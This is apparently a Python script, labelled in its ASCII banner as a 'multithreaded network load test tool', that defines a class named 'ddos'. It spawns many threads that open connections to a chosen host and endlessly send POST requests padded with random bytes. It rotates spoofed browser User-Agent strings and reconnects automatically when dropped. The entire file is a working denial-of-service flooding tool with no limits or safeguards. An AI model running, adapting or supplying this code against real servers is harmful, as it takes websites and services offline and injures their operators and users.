from threading import Thread
from random import choice, uniform, randint
import socket, ssl, time, os

def Document():
    return """\
        ░█▀█░░░█▄█░█░█░█░░░▀█▀░▀█▀░▀█▀░█░█░█▀▄░█▀▀░█▀█░█▀▄░█▀▀░█▀▄
        ░█▀█░░░█░█░█░█░█░░░░█░░░█░░░█░░█▀█░█▀▄░█▀▀░█▀█░█░█░█▀▀░█░█
        ░▀░▀░░░▀░▀░▀▀▀░▀▀▀░░▀░░▀▀▀░░▀░░▀░▀░▀░▀░▀▀▀░▀░▀░▀▀░░▀▀▀░▀▀░
        ░█▀█░█▀▀░▀█▀░█░█░█▀█░█▀▄░█░█░░░█░░░█▀█░█▀█░█▀▄░░░▀█▀░█▀▀░█▀▀░▀█▀
        ░█░█░█▀▀░░█░░█▄█░█░█░█▀▄░█▀▄░░░█░░░█░█░█▀█░█░█░░░░█░░█▀▀░▀▀█░░█░
        ░▀░▀░▀▀▀░░▀░░▀░▀░▀▀▀░▀░▀░▀░▀░░░▀▀▀░▀▀▀░▀░▀░▀▀░░░░░▀░░▀▀▀░▀▀▀░░▀░
        ░▀█▀░█▀█░█▀█░█░░░░░█░█░█▀▀░▀█▀░█▀█░█▀▀░░░█▀▀░█▀█░█▀▀░█░█░█▀▀░▀█▀░░░
        ░░█░░█░█░█░█░█░░░░░█░█░▀▀█░░█░░█░█░█░█░░░▀▀█░█░█░█░░░█▀▄░█▀▀░░█░░░░
        ░░▀░░▀▀▀░▀▀▀░▀▀▀░░░▀▀▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░░░▀▀▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░░▀░░▀░"""

def CheckSSLMode(arg :str):
    if arg.lower() == 'true': return True
    elif arg.lower() == 'false': return False

class ddos:
    def __init__(self, hostname :str, port :int, SSL_Mode :bool = False, NOT :int = 32):
        self.hostname = hostname
        self.port = port
        self.SSL_Mode = SSL_Mode
        self.NOT = NOT

        self.UserAgent = (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36",
            "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.3538.77 Safari/537.36",
            "Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Safari/605.1.15",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 OPR/76.0.4017.94",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4474.0 Safari/537.36 Edg/92.0.873.1",
            "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4464.5 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 OPR/76.0.4017.94",
            "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36",
            "Mozilla/5.0 (Android 11; Mobile; LG-M255; rv:88.0) Gecko/88.0 Firefox/88.0",
            "Mozilla/5.0 (Linux; Android 6.0.1; NEO-U9-H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Safari/537.36 OPR/63.3.3216.58675",
            "Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36 EdgA/46.3.4.5155",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Snapchat/10.77.5.59 (like Safari/604.1)",
            "Mozilla/5.0 (iPod; CPU iPhone OS 14_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/87.0.4280.163 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/33.0 Mobile/15E148 Safari/605.1.15",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 EdgiOS/46.3.7 Mobile/15E148 Safari/605.1.15"
        )
    
    @property
    def CreateSocket(self):
        SSLContext = ssl.create_default_context()
        BasicSocket = socket.create_connection((self.hostname, self.port))
        if self.SSL_Mode:
            return SSLContext.wrap_socket(BasicSocket, server_hostname=self.hostname)
        return BasicSocket

    @property
    def attack(self):
        def CreateThread(ThreadNumber :int, HTTP_PROTOCOL :str):
            s = self.CreateSocket
            
            HTTP_Data = (
                f'POST /?index=index&usr=1234&pwd=1234&msg=1234 HTTP/1.1\r\n'
                f'Host: {self.hostname}:{self.port}\r\n'
                f'Accept: */*\r\n'
                f'Connection: keep-alive\r\n'
                f'Content-Type: application/x-www-form-urlencoded\r\n'
                f'Content-Length: 1024\r\n'
                f'Referer: {HTTP_PROTOCOL}://{self.hostname}/\r\n'
                f'User-Agent: {choice(self.UserAgent)}\r\n\r\n'
            ).encode() + os.urandom(1024)
            
            while True:
                try:
                    s.sendall(HTTP_Data)
                    print(f'\r>>>> Thread {ThreadNumber:>3}: {len(HTTP_Data):>4} bytes of data sent.', end='')
                except (ConnectionAbortedError, ConnectionError, ConnectionRefusedError, ConnectionResetError):
                    time.sleep(uniform(0, 2))
                    s = self.CreateSocket
        
        HTTP_PROTOCOL = 'http'
        if self.SSL_Mode:
            HTTP_PROTOCOL = 'https'
        
        th = [Thread(target = CreateThread, args = (ThreadNumber, HTTP_PROTOCOL)) for ThreadNumber in range(1, self.NOT + 1)]
        for ThreadIndex in th:
            ThreadIndex.start()
        for ThreadIndex in th:
            ThreadIndex.join()

























